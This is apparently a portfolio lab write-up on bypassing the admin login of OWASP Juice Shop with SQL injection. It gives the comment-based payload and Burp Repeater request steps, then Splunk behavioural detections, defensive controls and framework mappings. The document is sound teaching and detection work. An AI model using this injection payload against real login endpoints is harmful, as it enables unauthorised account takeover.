# Phase 2 — SQL Injection: Authentication Bypass

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)
**OWASP Category:** A03:2021 — Injection
**Juice Shop Challenge:** Login Admin (★★)

---

## Objective

Bypass authentication on the Juice Shop login endpoint via SQL injection, gaining administrative access without valid credentials. Detect the attack despite the payload being delivered in a JSON POST body that nginx access logs do not capture.

---

## Vulnerability

Juice Shop's login endpoint (`POST /rest/user/login`) accepts a JSON body containing `email` and `password`. The backend constructs a SQL query of approximately the following form:

```sql
SELECT * FROM Users 
WHERE email = '<user_supplied_email>' 
  AND password = '<hash_of_user_supplied_password>'
```

Because the email value is concatenated directly into the SQL string without parameterisation, a single quote terminates the literal early and allows arbitrary SQL to be injected. The classic bypass uses a SQL comment (`--`) to discard the password check:

```
Input email:   admin@juice-sh.op'--
Input password: anything

Resulting query:
SELECT * FROM Users 
WHERE email = 'admin@juice-sh.op'--' AND password = '<hash>'
                                  ^^ everything after is commented out
```

The server returns the user record for `admin@juice-sh.op` along with a valid session JWT.

This is a NIST SP 800-53 SI-10 (Information Input Validation) control failure.

---

## Exploitation

### Step 1: Generate a Baseline Login Request

Through Burp's browser, navigate to Juice Shop's login page and submit invalid credentials:

- Email: `test@test.com`
- Password: `wrongpassword`

The submission produces a `POST /rest/user/login` request visible in **Proxy → HTTP history**, returning HTTP 401 Unauthorized.

### Step 2: Send to Repeater

Right-click the login request → **Send to Repeater**. The Repeater tab now contains the request, ready for modification and replay:

```http
POST /rest/user/login HTTP/1.1
Host: 10.10.10.50
Content-Type: application/json
Content-Length: 47

{
  "email": "test@test.com",
  "password": "wrongpassword"
}
```

### Step 3: Validate Baseline

Click **Send** in Repeater without modification. Confirm the response is:

```http
HTTP/1.1 401 Unauthorized
...
{"error":"Invalid email or password."}
```

This confirms the request is well-formed and the credentials are rejected.

### Step 4: Inject SQLi Payload

Modify the request body to:

```json
{
  "email": "admin@juice-sh.op'--",
  "password": "anything"
}
```

The email value contains:
- The legitimate admin email (`admin@juice-sh.op`)
- A single quote (`'`) closing the SQL string literal
- A SQL comment (`--`) discarding the password check

### Step 5: Execute the Injection

Click **Send** in Repeater. The response changes dramatically:

```http
HTTP/1.1 200 OK
Server: nginx/1.28.3 (Ubuntu)
Content-Type: application/json; charset=utf-8
Content-Length: ~1100
...
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMi...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

The presence of `"umail":"admin@juice-sh.op"` and a fresh JWT confirm successful admin impersonation. The Juice Shop "Login Admin" challenge is marked complete on the Score Board.

---

## Detection

### The Detection Challenge

Inspecting the nginx access log entry for the malicious request reveals a critical gap:

```json
{
  "timestamp":"2026-05-26T00:43:13+10:00",
  "remote_addr":"10.10.10.5",
  "method":"POST",
  "uri":"/rest/user/login",
  "path":"/rest/user/login",
  "query":"",
  "status":200,
  "bytes_sent":1193,
  "request_time":0.110,
  "user_agent":"Mozilla/5.0 ...",
  ...
}
```

**The payload `admin@juice-sh.op'--` does not appear anywhere in the log.** nginx does not capture POST request bodies by default. Pattern-based detection on SQLi keywords against this telemetry will produce zero detections.

This is the most important learning of the lab. In a real SOC environment, the same situation arises for every API endpoint that receives JSON bodies — payload-based regex detection cannot see the attack.

### Solution: Behavioural Detection

Even without payload visibility, the following observable signals reveal the attack:

1. **Status code transition** — same source IP produces a `401` followed by a `200` on the same login endpoint
2. **Response size anomaly** — successful auth returns ~1193 bytes (JWT included) vs ~421 bytes for failure
3. **Velocity** — multiple POSTs to `/rest/user/login` from one IP in a short time window

#### Detection 1: Authentication Pattern Anomaly (Tuned)

```spl
index=main sourcetype="nginx:juice-shop:json" uri="/rest/user/login" method=POST earliest=-1h
| stats count(eval(status=401)) as failed_attempts 
        count(eval(status=200)) as successful_attempts
        min(_time) as first_attempt 
        max(_time) as last_attempt 
        by remote_addr
| eval window_seconds = round(last_attempt - first_attempt, 0)
| eval risk_score = case(
    failed_attempts >= 10 AND successful_attempts >= 1, 90,
    failed_attempts >= 5 AND successful_attempts >= 1 AND window_seconds < 60, 80,
    failed_attempts >= 3 AND successful_attempts >= 1 AND window_seconds < 30, 70,
    failed_attempts >= 1 AND successful_attempts >= 1, 40
)
| where risk_score > 0
| eval first_attempt = strftime(first_attempt, "%H:%M:%S")
| eval last_attempt = strftime(last_attempt, "%H:%M:%S")
| eval detection_name = "A03 Credential Bypass / SQLi (behavioural)"
| eval severity = case(
    risk_score >= 80, "critical",
    risk_score >= 60, "high",
    true(), "medium"
)
| table _time, remote_addr, failed_attempts, successful_attempts, window_seconds, risk_score, detection_name, severity
| sort - risk_score
```

**Logic:** A risk score is assigned based on the combination of failed login count, successful login count, and time window. A single failure followed by a single success scores 40 (medium severity, monitoring). Ten failures followed by a success scores 90 (critical, investigate immediately). The thresholds intentionally allow legitimate "mistyped password" patterns through without alerting.

**Lab result:** Source IP `10.10.10.5` was detected with `failed_attempts=1, successful_attempts=1, window_seconds=308, risk_score=40, severity=medium`. The pattern was caught without payload visibility.

#### Detection 2: Response Size Anomaly

A successful authentication response is significantly larger than a failure response because it contains a JWT. Statistical detection catches this without pattern matching:

```spl
index=main sourcetype="nginx:juice-shop:json" uri="/rest/user/login" method=POST earliest=-24h
| eventstats avg(bytes_sent) as avg_size stdev(bytes_sent) as std_size
| eval z_score = round((bytes_sent - avg_size) / std_size, 2)
| where z_score > 2
| eval detection_name = "A03 Login response size anomaly"
| eval severity = "medium"
| table _time, remote_addr, status, bytes_sent, avg_size, z_score, detection_name, severity
```

**Logic:** Any response on the login endpoint that is more than two standard deviations larger than baseline is flagged. Useful as a secondary corroborating signal alongside Detection 1.

---

## Detection Validation

To validate the tuned detection against a more aggressive attack pattern, the test was repeated with:

- 8 rapid failed login attempts (varying invalid emails)
- 2 SQLi bypass attempts in succession

Result: `risk_score=80, severity=critical` (matches the "5+ failures + 1 success within 60 seconds" tier).

This confirms the detection tiers escalate appropriately as attack intensity increases.

---

## SOC Analyst Notes

### Why This Matters

- **Most real-world API security depends on body inspection that network logs can't provide.** This is exactly why organisations deploy Web Application Firewalls (ModSecurity, Cloudflare WAF, AWS WAF) — they sit at the application layer and can see decrypted POST bodies.
- **Behavioural detection is genuinely powerful** when implemented well. The detection here would catch:
  - SQL injection auth bypass (this lab)
  - Credential stuffing attacks
  - Password spray attacks
  - Compromised credential reuse following a brute force probe
- **Tuning matters more than payloads.** A poorly tuned detection (e.g. requiring exact SQLi keyword match) misses 100% of obfuscated payloads. A well-tuned behavioural rule catches the entire class of attacks.

### Recommended Defensive Controls

For the academic / governance portion of this work:

| Control | Standard | Effect |
|---------|----------|--------|
| Parameterised queries / prepared statements | NIST SP 800-53 SI-10 | Eliminates the vulnerability entirely |
| Web Application Firewall | NIST CSF 2.0 PR.DS-02, ISO 27001 A.8.26 | Detects payload before it reaches the app |
| Application access logs with body capture | NIST SP 800-53 AU-2, AU-3 | Closes the detection gap demonstrated above |
| Rate limiting on authentication endpoints | NIST CSF 2.0 PR.AC-07 | Slows brute-force escalation |
| Account lockout / progressive delays | OWASP ASVS V2.2.1 | Forces attacker into detectable pattern |
| MFA for privileged accounts | ACSC Essential Eight | Mitigates impact of credential compromise |

---

## Mapping

| Framework | Control / Reference |
|-----------|---------------------|
| OWASP Top 10 | A03:2021 — Injection |
| MITRE ATT&CK | T1190 — Exploit Public-Facing Application |
| NIST CSF 2.0 | DE.CM-01 (Network Monitoring), DE.AE-02 (Event Analysis), PR.AC-07 (Authentication) |
| NIST SP 800-53 | SI-10 (Information Input Validation), AU-6 (Audit Review), IA-2 (Identification and Authentication) |
| ISO 27001:2022 | A.8.26 (Application Security Requirements), A.5.17 (Authentication Information) |
| ACSC Essential Eight | Multi-Factor Authentication, Application Hardening |
| APRA CPS 234 | Paragraph 27 (security controls commensurate with the threat) |
| Privacy Act 1988 | APP 11 — Security of Personal Information (relevant if admin access enables PII exposure) |

---

## Evidence Artifacts

For portfolio purposes, the following artifacts were captured during this phase:

1. Burp Repeater screenshots showing 401 baseline and 200 SQLi success responses
2. Splunk search result showing `risk_score: 40, severity: medium` detection firing
3. Validation screenshot showing `risk_score: 80, severity: critical` after aggressive testing
4. Raw nginx log JSON event demonstrating the absence of POST body content (the detection gap)
